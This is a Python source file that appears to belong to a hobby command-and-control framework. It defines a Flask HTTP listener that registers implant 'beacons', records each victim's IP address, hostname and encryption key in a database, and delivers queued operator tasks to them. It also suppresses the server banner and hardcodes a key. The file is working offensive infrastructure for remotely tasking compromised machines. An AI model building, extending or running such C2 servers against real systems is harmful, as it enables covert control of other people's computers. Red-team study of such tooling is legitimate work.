import sys
import os
import threading

# from core.stash import *
from core.logger import *
from random import choice
from string import ascii_letters
from multiprocessing import Process
from flask import Flask, render_template, request

class HTTP_listener:

    def __init__(self, name, ip, port, stash):
        self.name = name
        self.ip = ip
        self.port = port

        self.stash = stash
        ## to fix (this one will change at each round!! and the first one maybe created at listener init!!)
        self.key = 'CIpAysYcPFRXEtalHHsll4_uQsG4vSQXwWhyoywDwnc' 

        ## to fix
        html_fold = '/home/blu/Documents/projectz/wtf_another_c2/core/html/'
        self.app = Flask(__name__, template_folder=html_fold)

        self.running = True

        @self.app.route('/', methods=['GET'])
        def index():
            return ('Hello there!')

        @self.app.route('/beacon/register', methods=['POST'])
        def register():
            beacon_name = ''.join(choice(ascii_letters) for i in range(10))
            beacon_ip = request.remote_addr
            beacon_hostname = request.form.get("name")
            beacon_type = request.form.get("type")

            success(f'New undercover agent {beacon_name}.')
            fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type, self.key)
            self.stash.sql_stash( """INSERT INTO agents( agent_name, \
                                                         listener_name, \
                                                         remote_ip, \
                                                         hostname, \
                                                         beacon_type, \
                                                         enc_key ) VALUES( ?, ?, ?, ?, ?, ? )""", fields )
            return (beacon_name, 200)

        @self.app.route('/task/<name>', methods=['GET'])
        def getinTask(name):
            tasks_a = self.stash.get_task(name)
            tasks = ' ---===--- '.join(tasks_a)
            self.stash.del_commands(name)
            if tasks:
                return (tasks, 200)
            else:
                return (tasks, 204)
        
        @self.app.errorhandler(404)
        def page_not_found(error):
            return (render_template(f'404.html', title = '404'), 404)

    def run(self):
        # to fix (debug False and logger True)
        self.app.logger.disabled = False
        self.app.run(port=self.port, host=self.ip, debug=True)

    def start(self):
        self.server = Process(name = self.name, target=self.run, args = (), daemon = True)

        ## no server banner
        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None

        self.server.start()
        self.running = True

        # self.server = Process(target=self.run)

        # ## no server banner
        # cli = sys.modules['flask.cli']
        # cli.show_server_banner = lambda *x: None

        # self.daemon = threading.Thread(name = self.name, target = self.server.start, args = (), daemon = True)
        # # self.daemon.daemon = True
        # self.daemon.start()

        # self.running = True

    def stop(self):
        self.server.terminate()
        self.server = None
        # self.daemon = None
        self.running = False